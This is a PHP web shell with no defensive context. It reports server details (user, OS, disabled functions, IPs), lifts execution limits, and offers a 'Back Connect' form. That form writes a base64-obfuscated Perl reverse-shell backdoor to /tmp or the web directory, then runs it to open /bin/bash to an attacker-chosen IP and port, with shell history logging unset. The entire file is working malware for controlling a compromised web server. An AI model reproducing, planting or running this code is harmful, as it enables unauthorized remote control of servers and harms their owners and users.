<font class="hk2" style="text-shadow: 1px -1px 8px;"><hr><td style="text-align: right; vertical-align: top; color: # ; padding-right: 3pt; border-right: 1px solid # ">
<?php
error_reporting(0);
if (!@$_GET['path']) {
    $dir = CleanDir(getcwd());
} else {
    $dir = CleanDir($_GET['path']);
}
$rootdir = CleanDir($_SERVER['DOCUMENT_ROOT']);
$domain = $_SERVER['HTTP_HOST'];
$script = $_SERVER['SCRIPT_NAME'];
$full_url = $_SERVER['REQUEST_URI'];
$script2 = basename($script);
$serverip = $_SERVER['SERVER_ADDR'];
$userip = $_SERVER['REMOTE_ADDR'];
$whoami = function_exists("posix_getpwuid") ? posix_getpwuid(posix_geteuid()) : exec("whoami");
$whoami = function_exists("posix_getpwuid") ? $whoami['name'] : exec("whoami");
$disabled = ini_get('disable_functions');
$bcperl_source = "IyEvdXNyL2Jpbi9wZXJsIAp1c2UgSU86OlNvY2tldDsgCiMgICBQcml2OCAqKiBQcml2OCAqKiBQ
cml2OCAKIyBIQUNLRVIgU0FLSVQgSEFUSSBDb25uZWN0IEJhY2sgU2hlbGwgICAgICAgICAgCiMg
Y29kZSBieTpIU0ggCiMgQVNMSSBJTkRPTkVTSUEgSkFXQVRJTVVSIEtPVEEgS0VESVJJICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKIyBFbWFpbDpwYXN1a2FuLmhh
Y2tlckB5YWhvby5jb20gCiMgCiNIc0hAU2xhY2t3YXJlTGludXg6L2hvbWUvcHJvZ3JhbWluZyQg
cGVybCBkYy5wbCAKIy0tPT0gQ29ubmVjdEJhY2sgQmFja2Rvb3IgU2hlbGwgdnMgMS4wIGJ5IEhB
Q0tFUiBTQUtJVCBIQVRJID09LS0gCiMgCiNVc2FnZTogZGMucGwgW0hvc3RdIFtQb3J0XSAKIyAK
I0V4OiBkYy5wbCAxMjcuMC4wLjEgMjEyMSAKI0hzSEBTbGFja3dhcmVMaW51eDovaG9tZS9wcm9n
cmFtaW5nJCBwZXJsIGRjLnBsIDEyNy4wLjAuMSAyMTIxIAojLS09PSBDb25uZWN0QmFjayBCYWNr
ZG9vciBTaGVsbCB2cyAxLjAgYnkgSEFDS0VSIFNBS0lUIEhBVEkgPT0tLSAKIyAKI1sqXSBSZXNv
bHZpbmcgSG9zdE5hbWUgCiNbKl0gQ29ubmVjdGluZy4uLiAxMjcuMC4wLjEgCiNbKl0gU3Bhd25p
bmcgU2hlbGwgCiNbKl0gQ29ubmVjdGVkIHRvIHJlbW90ZSBob3N0IAoKI2Jhc2gtMi4wNWIjIG5j
IC12diAtbCAtcCAyMTIxIAojbGlzdGVuaW5nIG9uIFthbnldIDIxMjEgLi4uIAojY29ubmVjdCB0
byBbMTI3LjAuMC4xXSBmcm9tIGxvY2FsaG9zdCBbMTI3LjAuMC4xXSAzMjc2OSAKIy0tPT0gQ29u
bmVjdEJhY2sgQmFja2Rvb3IgdnMgMS4wIGJ5IEhBQ0tFUiBTQUtJVCBIQVRJID09LS0gCiMgCiMt
LT09U3lzdGVtaW5mbz09LS0gCiNMaW51eCBTbGFja3dhcmVMaW51eCAyLjYuNyAjMSBTTVAgVGh1
IERlYyAyMyAwMDowNTozOSBJUlQgMjAwNCBpNjg2IHVua25vd24gdW5rbm93biBHTlUvTGludXgg
CiMgCiMtLT09VXNlcmluZm89PS0tIAojdWlkPTEwMDEoSHNIKSBnaWQ9MTAwKHVzZXJzKSBncm91
cHM9MTAwKHVzZXJzKSAKIyAKIy0tPT1EaXJlY3Rvcnk9PS0tIAojL3Jvb3QgCiMgCiMtLT09U2hl
bGw9PS0tIAojIAokc3lzdGVtICAgPSAnL2Jpbi9iYXNoJzsgCiRBUkdDPUBBUkdWOyAKcHJpbnQg
IklIUyBCQUNLLUNPTk5FQ1QgQkFDS0RPT1JcblxuIjsgCmlmICgkQVJHQyE9MikgeyAKICAgcHJp
bnQgIlVzYWdlOiAkMCBbSG9zdF0gW1BvcnRdIFxuXG4iOyAKICAgZGllICJFeDogJDAgMTI3LjAu
MC4xIDIxMjEgXG4iOyAKfSAKdXNlIFNvY2tldDsgCnVzZSBGaWxlSGFuZGxlOyAKc29ja2V0KFNP
Q0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sIGdldHByb3RvYnluYW1lKCd0Y3AnKSkgb3IgZGll
IHByaW50ICJbLV0gVW5hYmxlIHRvIFJlc29sdmUgSG9zdFxuIjsgCmNvbm5lY3QoU09DS0VULCBz
b2NrYWRkcl9pbigkQVJHVlsxXSwgaW5ldF9hdG9uKCRBUkdWWzBdKSkpIG9yIGRpZSBwcmludCAi
Wy1dIFVuYWJsZSB0byBDb25uZWN0IEhvc3RcbiI7IApwcmludCAiWypdIFJlc29sdmluZyBIb3N0
TmFtZVxuIjsgCnByaW50ICJbKl0gQ29ubmVjdGluZy4uLiAkQVJHVlswXSBcbiI7IApwcmludCAi
WypdIFNwYXduaW5nIFNoZWxsIFxuIjsgCnByaW50ICJbKl0gQ29ubmVjdGVkIHRvIHJlbW90ZSBo
b3N0IFxuIjsgClNPQ0tFVC0+YXV0b2ZsdXNoKCk7IApvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsg
Cm9wZW4oU1RET1VULCI+JlNPQ0tFVCIpOyAKb3BlbihTVERFUlIsIj4mU09DS0VUIik7IApwcmlu
dCAiSUhTIEJBQ0stQ09OTkVDVCBCQUNLRE9PUiAgXG5cbiI7IApzeXN0ZW0oInVuc2V0IEhJU1RG
SUxFOyB1bnNldCBTQVZFSElTVCA7ZWNobyAtLT09U3lzdGVtaW5mbz09LS0gOyB1bmFtZSAtYTtl
Y2hvOyAKZWNobyAtLT09VXNlcmluZm89PS0tIDsgaWQ7ZWNobztlY2hvIC0tPT1EaXJlY3Rvcnk9
PS0tIDsgcHdkO2VjaG87IGVjaG8gLS09PVNoZWxsPT0tLSAiKTsgCnN5c3RlbSgkc3lzdGVtKTsg
CiNFT0Y=";
@ini_set("memory_limit", "9999M");
@ini_set("max_execution_time", "0");
@ini_set("upload_max_filesize", "9999m");
@ini_set("magic_quotes_gpc", "0");
@set_magic_quotes_runtime(0);
set_time_limit(0);
if (empty($disabled)) {
    $disabled = "None";
}
function CleanDir($directory) {
    $directory = str_replace("\\", "/", $directory);
    $directory = str_replace("//", "/", $directory);
    return $directory;
}
function success($for, $var1) {
    $domain = $_SERVER['HTTP_HOST'];
    $script = $_SERVER['SCRIPT_NAME'];
    $full_url = $_SERVER['REQUEST_URI'];
    if ($for == "filesave") {
        $message = "File Saved!";
        $redirect = "http://$domain$script?path=$var1";
    }
	
    if (empty($redirect)) {
        echo "<script>
function remove (){
 document.getElementById('xbox').innerHTML='';
}
setInterval(function(){remove();}, 2700);
</script>";
    } else {
        echo "<script>
function remove (){
 window.location = '$redirect'
}
setInterval(function(){remove();}, 2500);
</script>";
    }
}
echo "<table border='1' width='100%'>
<tr>
<th>User</th>
<th>System</th>
<th>Server Software</th>
<th>safe_mode</th>
<th>open_basedir</th>
<th>Disable Functions</th>
<th>Your IP</th>
<th>Server IP</th>
</tr>";
$system = php_uname();
$software = $_SERVER['SERVER_SOFTWARE'];
if (strpos($software, "Win") != FALSE) {
    $whoami = strstr($whoami, "\\");
    $whoami = substr($whoami, 1);
}
$safemode = ini_get('safe_mode');
if ($safemode) {
    $safemode = "Enabled";
} else {
    $safemode = "Disabled";
}
$openbase = ini_get('open_basedir');
if ($openbase) {
    $openbase = "Enabled";
} else {
    $openbase = "Disabled";
}
echo "<tr>
<td>$whoami</td>
<td>$system</td>
<td>$software</td>
<td>$safemode</td>
<td>$openbase</td>
<td>$disabled</td>
<td>$userip</td>
<td>$serverip</td>
</tr>
</table>
<br><div style='-moz-border-radius: webkit-border-radius: 10px 5px 10px 5px; background-color: #; border-radius: 10px; border: 1px solid white ;'>";
echo "<center><font size='4' color='aqua '><b>
[ <a href='http://$domain$script?back' class='navbar'>Back Connect</a> ]  
</b></font></center><br>";
if (isset($_GET['back'])) {
    echo "
		<form method='POST'>
			<center>
			<font color='aqua'>
				IP: <input type='text' class='text' name='ip' value='$userip' />
				Port: <input type='text' class='text' name='port' value='2121' size='3'/><br>
				<input type='submit' name='backC' value='Connect' />
				</font>
			</center>
		</form>
	";
    if (isset($_POST['backC'])) {
        $port = $_POST['port'];
        $bcip = $_POST['ip'];
        $bc_decode = base64_decode($bcperl_source);
        if (is_dir('/tmp')) {
            if (file_put_contents("/tmp/bc.pl", $bc_decode)) {
                $bc_command = "perl /tmp/bc.pl $bcip $port";
                cmd2($bc_command, $dir);
                echo "<center><font color='# ' size='3'>Trying to connect!</font></center><br>";
            } else {
                error("Failed to write perl script to /tmp!");
            }
        } elseif (is_writeable($dir)) {
            if (file_put_contents("$dir/bc.pl", $bc_decode)) {
                $bc_command = "perl $dir/bc.pl $bcip $port";
                cmd2($bc_command, $dir);
                echo "<center><font color='# ' size='3'>Trying to connect!</font></center><br>";
            } else {
                error("Failed to write perl script to $dir!");
            }
        } else {
            error("/tmp does not exist and current directory is not writable!");
        }
    }
}
echo "</form></div>";
closedir();
?> 
